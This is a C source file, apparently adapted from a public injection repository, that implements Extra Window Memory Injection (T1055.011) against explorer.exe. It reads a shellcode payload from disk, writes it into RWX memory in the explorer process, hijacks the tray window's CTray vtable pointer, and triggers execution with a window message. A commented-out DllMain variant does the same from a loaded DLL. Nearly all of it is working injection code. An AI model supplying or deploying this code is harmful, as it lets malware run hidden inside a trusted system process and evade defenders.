/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

// Original: https://github.com/odzhan/injection

#define WIN32_LEAN_AND_MEAN

#include "ntlib/nttpp.h"
#include "ntlib/util.h"
#include "ewm.h"

#include <evntrace.h>
#include <pla.h>
#include <wbemidl.h>
#include <wmistr.h>
#include <evntcons.h>

LPVOID ewm(LPVOID payload, DWORD payloadSize){
    LPVOID    cs, ds;
    CTray     ct;
    ULONG_PTR ctp;
    HWND      hw;
    HANDLE    hp;
    DWORD     pid;
    SIZE_T    wr;
    
    // 1. Obtain a handle for the shell tray window
    hw = FindWindow("Shell_TrayWnd", NULL);

    // 2. Obtain a process id for explorer.exe
    GetWindowThreadProcessId(hw, &pid);
    
    //print pid
    printf("find window ID=%d\n", pid);

    // 3. Open explorer.exe
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // 4. Obtain pointer to the current CTray object
    ctp = GetWindowLongPtr(hw, 0);
    if (ctp == 0)
    {
        printf("GetWindowLongPtr failed!\n");
        CloseHandle(hp);
        return;
    }
    
    printf("ctp: %p\n", ctp);

    // 5. Read address of the current CTray object
    ReadProcessMemory(hp, (LPVOID)ctp, (LPVOID)&ct.vTable, sizeof(ULONG_PTR), &wr);
    
    // 6. Read three addresses from the virtual table
    ReadProcessMemory(hp, (LPVOID)ct.vTable, (LPVOID)&ct.AddRef, sizeof(ULONG_PTR) * 3, &wr);
    
    // 7. Allocate RWX memory for code
    cs = VirtualAllocEx(hp, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    // 8. Copy the code to target process
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);

    // 9. Allocate RW memory for the new CTray object
    ds = VirtualAllocEx(hp, NULL, sizeof(ct), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // 10. Write the new CTray object to remote memory
    ct.vTable  = (ULONG_PTR)ds + sizeof(ULONG_PTR);
    ct.WndProc = (ULONG_PTR)cs;
    
    WriteProcessMemory(hp, ds, &ct, sizeof(ct), &wr); 

    // 11. Set the new pointer to CTray object
    SetWindowLongPtr(hw, 0, (ULONG_PTR)ds);
    if (SetWindowLongPtr(hw, 0, (ULONG_PTR)ds) == 0) 
    {
        printf("SetWindowLongPtr failed!\n");
        VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT);
        VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT);
        CloseHandle(hp);
        return;
    }

    // 12. Trigger the payload via a windows message
    PostMessage(hw, WM_CLOSE, 0, 0);

    Sleep(1);

    // 13. Restore the original CTray object
    SetWindowLongPtr(hw, 0, ctp);

    // 14. Release memory and close handles
    VirtualFreeEx(hp, cs, 0, MEM_DECOMMIT | MEM_RELEASE);
    VirtualFreeEx(hp, ds, 0, MEM_DECOMMIT | MEM_RELEASE);

    CloseHandle(hp);
}

// __declspec(dllexport) DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved );
// __declspec(dllexport) DllMainCRTStartup(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved );

// DllMainCRTStartup() {
//   DllMain(GetModuleHandle(NULL), DLL_PROCESS_ATTACH, NULL);
// }
int main(void) {
  // Reads payload.exeXX.bin from disk with ReadFile
  // and loads it into memory
  // LPVOID payload = NULL;
  // DWORD  payloadSize = 0;
  // #if defined(_WIN64)
  //   HANDLE hFile = CreateFileA("payload.exe64.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
  // #else
  //   HANDLE hFile = CreateFileA("payload.exe32.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
  // #endif
  
  // if(hFile != INVALID_HANDLE_VALUE) {
  //   payloadSize = GetFileSize(hFile, NULL);
  //   payload = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
  //   if(payload != NULL) {
  //     ReadFile(hFile, payload, payloadSize, &payloadSize, NULL);
  //   }
  //   CloseHandle(hFile);
  // }

  LPVOID payload = NULL;
  DWORD  payloadSize = 0;
  #if defined(_WIN64)
    payloadSize = readpic("payload.exe64.bin", &payload);
  #else
    payloadSize = readpic("payload.exe32.bin", &payload);
  #endif
  if (payloadSize == 0) { printf("invalid payload\n"); return 0; }

  // Executes payload usin Extra Window Memory Injection (T1055.011)
  ewm(payload, payloadSize);

  return 0;
}

// BOOL WINAPI DllMain(
//     HINSTANCE hinstDLL,  // handle to DLL module
//     DWORD fdwReason,     // reason for calling function
//     LPVOID lpvReserved )  // reserved
// {
//     switch( fdwReason ) 
//     { 
//         case DLL_PROCESS_ATTACH:
//           // Reads payload.exeXX.bin from disk with ReadFile
//           // and loads it into memory
//           LPVOID payload = NULL;
//           DWORD  payloadSize = 0;
//           #if defined(_WIN64)
//             HANDLE hFile = CreateFileA("payload.exe64.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
//           #else
//             HANDLE hFile = CreateFileA("payload.exe32.bin", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
//           #endif
          
//           if(hFile != INVALID_HANDLE_VALUE) {
//             payloadSize = GetFileSize(hFile, NULL);
//             payload = VirtualAlloc(NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            
//             if(payload != NULL) {
//               ReadFile(hFile, payload, payloadSize, &payloadSize, NULL);
//             }
//             CloseHandle(hFile);
//           }

//           // Executes payload usin Extra Window Memory Injection (T1055.011)
//           ewm(payload, payloadSize);
//           break;

//         case DLL_THREAD_ATTACH:
//         case DLL_THREAD_DETACH:
//         case DLL_PROCESS_DETACH:
//           break;
//     }
//     return TRUE;
//     UNREFERENCED_PARAMETER(hinstDLL); 
//     UNREFERENCED_PARAMETER(lpvReserved); 
// }

